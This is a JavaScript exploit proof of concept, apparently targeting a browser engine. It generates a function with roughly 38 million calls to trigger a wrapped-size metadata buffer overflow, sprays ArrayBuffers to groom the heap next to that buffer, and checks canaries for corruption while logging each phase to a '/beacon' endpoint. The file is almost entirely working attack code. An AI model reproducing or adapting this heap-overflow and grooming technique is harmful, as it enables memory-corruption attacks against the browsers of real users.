// p142 — heap groom + metadata overflow test
// Strategy: place ArrayBuffer targets in same marge bitfit pages as metadata,
// so OOB write corrupts their backing stores before hitting unmapped memory
// Beacon prefix: V142H-

(function() {
  var B = function(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V142H-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  };
  var BS = function(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V142H-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch(e) {}
  };

  B('BOOT');

  // ============================================================
  // PHASE 1: Build the overflow function FIRST (parse only, don't call)
  // N=38,348,816 op_call entries, stride=112 → wraps to ~100KB
  // ============================================================

  var N_TARGET = 38348816;
  var CHUNK = 4000000;
  var CHUNKS = Math.floor(N_TARGET / CHUNK); // 9
  var REM = N_TARGET - CHUNKS * CHUNK;       // 2348816

  B('BUILD-START');

  var callChunk = '';
  for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
  var remChunk = '';
  for (var r = 0; r < REM; r++) remChunk += 'a();';

  var parts = ['window.__v142fn=function(a){'];
  for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
  parts.push(remChunk);
  parts.push('};window.__v142ok=true;');

  var blob = new Blob(parts, { type: 'application/javascript' });
  B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');

  // Free the string builders
  callChunk = null;
  remChunk = null;
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');

  sc.onload = function() {
    B('COMPILED-' + (window.__v142ok ? 'OK' : 'FAIL'));

    if (!window.__v142fn) {
      B('NO-FN');
      return;
    }

    // ============================================================
    // PHASE 2: Spray ArrayBuffer targets at ~100KB
    // These go through FastMalloc → libpas marge bitfit (4MB pages)
    // Same allocator as MetadataTableMalloc
    // ============================================================

    var TSIZE = 100096; // match the wrapped metadata size exactly
    var TCOUNT = 200;   // 200 × 100KB = ~20MB — modest, should fit
    var targets = [];

    B('GROOM-START');

    for (var t = 0; t < TCOUNT; t++) {
      try {
        targets[t] = new ArrayBuffer(TSIZE);
        var v = new DataView(targets[t]);
        // Write canary at multiple offsets
        v.setUint32(0, 0xCAFE0000 | t, true);
        v.setUint32(4, 0xDEAD0000 | t, true);
        // Also write canaries at positions that map to JSArrayBufferView fields
        // if metadata overwrites object headers
        v.setFloat64(16, 3.14159 + t, true); // would be m_vector position
        v.setFloat64(24, 2.71828 + t, true); // would be m_length position
        v = null;
      } catch(e) {
        B('GROOM-FAIL-' + t);
        break;
      }
    }

    B('GROOM-DONE-' + targets.length);

    // ============================================================
    // PHASE 3: Also spray small ArrayBuffers (128 bytes) that could
    // end up as JSArrayBufferView objects adjacent to metadata
    // ============================================================

    var smalls = [];
    var SCOUNT = 5000;
    for (var s = 0; s < SCOUNT; s++) {
      smalls[s] = new ArrayBuffer(128);
      var sv = new Uint8Array(smalls[s]);
      sv[0] = 0xBB;
      sv[1] = (s >> 8) & 0xFF;
      sv[2] = s & 0xFF;
      sv = null;
    }
    B('SMALLS-' + SCOUNT);

    // ============================================================
    // PHASE 4: CALL THE OVERFLOW FUNCTION
    // This triggers: link() → allocates ~100KB metadata buffer in marge bitfit
    // Then: finishCreation iterates 38.3M instructions, writing 112-byte entries
    // The write goes OOB past the buffer into adjacent marge page allocations
    // Process will crash when sweep leaves the 4MB marge page, but by then
    // adjacent targets in the same page are already corrupted
    // ============================================================

    BS('CALLING');

    try {
      window.__v142fn(function(){});
    } catch(e) {
      B('CATCH-' + (e.message ? e.message.substring(0, 40) : 'unk'));
    }

    // If we reach here, the sweep somehow completed (unlikely but great)
    B('SURVIVED');

    // ============================================================
    // PHASE 5: Check targets for corruption
    // ============================================================

    var corrupted = 0;
    var details = [];

    for (var t = 0; t < targets.length; t++) {
      try {
        var v = new DataView(targets[t]);
        var h0 = v.getUint32(0, true);
        var h1 = v.getUint32(4, true);
        var expected0 = (0xCAFE0000 | t) >>> 0;
        var expected1 = (0xDEAD0000 | t) >>> 0;
        if (h0 !== expected0 || h1 !== expected1) {
          corrupted++;
          if (details.length < 10) {
            details.push(t + ':' + h0.toString(16) + ',' + h1.toString(16));
          }
        }
        // Check byteLength — if metadata overwrote the JSArrayBuffer header,
        // byteLength itself might have changed
        if (targets[t].byteLength !== TSIZE) {
          if (details.length < 10) {
            details.push('LEN' + t + ':' + targets[t].byteLength);
          }
        }
        v = null;
      } catch(e) {
        corrupted++;
        if (details.length < 10) {
          details.push('ERR' + t);
        }
      }
    }

    B('CORRUPT-' + corrupted + '-OF-' + targets.length);
    if (details.length > 0) {
      B('DETAILS-' + details.join('|'));
    }

    // Check smalls too
    var scorrupt = 0;
    for (var s = 0; s < smalls.length; s++) {
      try {
        var sv = new Uint8Array(smalls[s]);
        if (sv[0] !== 0xBB) {
          scorrupt++;
        }
        if (smalls[s].byteLength !== 128) {
          scorrupt++;
        }
        sv = null;
      } catch(e) {
        scorrupt++;
      }
    }
    B('SCORRUPT-' + scorrupt + '-OF-' + smalls.length);

    B('DONE');
  };

  sc.onerror = function() {
    B('SCRIPT-ERR');
  };

  document.head.appendChild(sc);
  sc.src = url;
})();
